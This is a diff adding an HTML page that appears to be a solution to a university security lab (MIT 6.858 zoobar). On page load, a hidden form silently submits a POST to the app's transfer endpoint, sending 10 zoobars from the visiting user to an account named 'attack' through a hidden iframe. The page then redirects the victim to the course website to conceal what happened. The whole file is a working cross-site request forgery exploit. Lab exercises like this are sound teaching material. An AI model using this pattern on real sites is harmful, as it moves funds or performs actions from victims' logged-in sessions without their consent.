@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" style="display:none" id="form" target="iframe" action="http://localhost:8080/zoobar/index.cgi/transfer">
+        <input type="text" value="10" name="zoobars">
+        <input type="text" value="attack" name="recipient">
+        <input type="text" value="Send" name="submission">
+    </form>
+    <iframe style="display:none" id="iframe" name="iframe" frameborder="0"></iframe>
+    <script>
+        document.getElementById('iframe').onload = function () {
+            parent.location.href = "http://css.csail.mit.edu/6.858/2012/";
+        }
+        document.getElementById('form').submit();
+    </script>
+</body>
+</html>
